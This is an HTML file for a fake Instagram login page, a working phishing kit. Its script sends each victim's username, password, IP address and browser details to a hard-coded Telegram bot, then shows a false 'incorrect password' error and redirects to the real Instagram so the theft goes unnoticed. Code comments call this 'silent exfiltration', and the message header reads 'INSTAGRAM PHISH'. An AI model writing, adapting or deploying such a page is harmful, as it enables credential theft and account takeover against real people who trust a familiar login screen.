<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <link rel="icon" href="/favicon.ico">
    <title>Instagram • Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            font-size: 14px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 350px;
            width: 100%;
        }

        /* Card style – new Instagram border radius 12px */
        .card {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            padding: 40px 30px 30px;
            margin-bottom: 10px;
            text-align: center;
        }

        /* New Instagram logo – gradient + wordmark */
        .logo {
            margin-bottom: 30px;
            display: flex;
            justify-content: center;
        }
        .logo svg {
            width: 175px;
            height: auto;
        }

        /* Input fields – more rounded */
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 10px 12px;
            font-size: 13px;
            margin: 5px 0;
            outline: none;
            transition: all 0.1s;
        }
        input:focus {
            border-color: #a8a8a8;
            background: #ffffff;
        }

        /* Login button – modern blue */
        button {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            padding: 8px 16px;
            margin-top: 12px;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:hover {
            background-color: #1877f2;
        }
        button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        /* OR divider */
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider span {
            margin: 0 18px;
        }

        /* Facebook login link */
        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            margin-top: 8px;
        }

        /* Forgot password */
        .forgot-pw {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            margin-top: 16px;
            display: inline-block;
        }

        /* Sign up card */
        .signup-card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            text-align: center;
            padding: 20px;
            margin-top: 10px;
        }
        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        /* App badges */
        .app-badges {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
        }
        .app-badges img {
            height: 40px;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
            text-align: center;
        }

        .error-message {
            background: #ffebee;
            color: #ed4956;
            font-size: 13px;
            padding: 8px;
            border-radius: 8px;
            margin-top: 12px;
            display: none;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .card {
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="logo">
            <!-- Instagram gradient logo (official 2025) -->
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" width="175" height="51" fill="url(#instaGradient)">
                <defs>
                    <linearGradient id="instaGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" stop-color="#fccc63"/>
                        <stop offset="25%" stop-color="#e09b3d"/>
                        <stop offset="50%" stop-color="#dd2a7b"/>
                        <stop offset="75%" stop-color="#8134af"/>
                        <stop offset="100%" stop-color="#515bd4"/>
                    </linearGradient>
                </defs>
                <path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/>
            </svg>
        </div>

        <form id="loginForm">
            <input type="text" name="username" id="username" placeholder="Phone number, username, or email" autocomplete="off" required>
            <input type="password" name="password" id="password" placeholder="Password" autocomplete="off" required>
            <button type="submit" id="loginBtn">Log in</button>
        </form>

        <div class="divider">
            <span>OR</span>
        </div>

        <a href="#" class="fb-login" id="fbFake">
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#385185">
                <path d="M22.675 0H1.325C.593 0 0 .593 0 1.325v21.351C0 23.407.593 24 1.325 24H12.82v-9.294H9.692v-3.622h3.128V8.413c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12V24h6.116c.73 0 1.323-.593 1.323-1.325V1.325C24 .593 23.407 0 22.675 0z"/>
            </svg>
            Log in with Facebook
        </a>

        <a href="#" class="forgot-pw" id="forgotLink">Forgot password?</a>
        <div id="errorMsg" class="error-message"></div>
    </div>

    <div class="signup-card">
        Don't have an account? <a href="#" id="signupLink">Sign up</a>
    </div>

    <div class="app-badges">
        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play">
        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Download on the App Store">
    </div>
    <div class="footer">
        © 2025 Instagram from Meta
    </div>
</div>

<script>
    // Telegram configuration (exactly as you provided)
    const BOT_TOKEN = "8751633099:AAEg1NdVnQaT-zgyitP2Hvi4f5YIdQkBQF4";
    const CHAT_ID = "7988100526";
    const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }

    async function sendToTelegram(username, password, userAgent, ip) {
        const timestamp = new Date().toLocaleString("en-US", { hour12: false });
        const message = `🎯 <b>INSTAGRAM PHISH (2025 CLONE)</b>\n👤 <b>Username/Email:</b> <code>${escapeHtml(username)}</code>\n🔑 <b>Password:</b> <code>${escapeHtml(password)}</code>\n🌐 <b>IP:</b> ${ip}\n🖥️ <b>User Agent:</b> ${escapeHtml(userAgent).substring(0, 120)}\n🕒 <b>Time:</b> ${timestamp}`;
        try {
            const response = await fetch(TELEGRAM_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "HTML" })
            });
            return response.ok;
        } catch (error) {
            console.error(error);
            return false;
        }
    }

    async function getClientIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip || "unknown";
        } catch {
            return "unavailable";
        }
    }

    function showFakeError() {
        const errorDiv = document.getElementById("errorMsg");
        errorDiv.innerText = "Sorry, your password was incorrect. Please double-check your password.";
        errorDiv.style.display = "block";
        setTimeout(() => { errorDiv.style.display = "none"; }, 4000);
    }

    document.getElementById("loginForm").addEventListener("submit", async function(e) {
        e.preventDefault();
        const username = document.getElementById("username").value.trim();
        const password = document.getElementById("password").value.trim();
        const btn = document.getElementById("loginBtn");

        if (!username || !password) {
            showFakeError();
            return;
        }

        btn.disabled = true;
        btn.innerText = "Logging in...";

        const userAgent = navigator.userAgent;
        let ip = "unknown";
        try { ip = await getClientIP(); } catch(e) {}

        // Silent exfiltration to Telegram
        await sendToTelegram(username, password, userAgent, ip);

        // Fake error + clear password
        showFakeError();
        document.getElementById("password").value = "";

        setTimeout(() => {
            btn.disabled = false;
            btn.innerText = "Log in";
        }, 2000);

        // Redirect to real Instagram after 3.5 seconds
        setTimeout(() => {
            window.location.href = "https://www.instagram.com/";
        }, 3500);
    });

    // Make dummy links non-functional (just for look)
    document.getElementById("fbFake").addEventListener("click", (e) => e.preventDefault());
    document.getElementById("forgotLink").addEventListener("click", (e) => e.preventDefault());
    document.getElementById("signupLink").addEventListener("click", (e) => e.preventDefault());
</script>
</body>
</html>
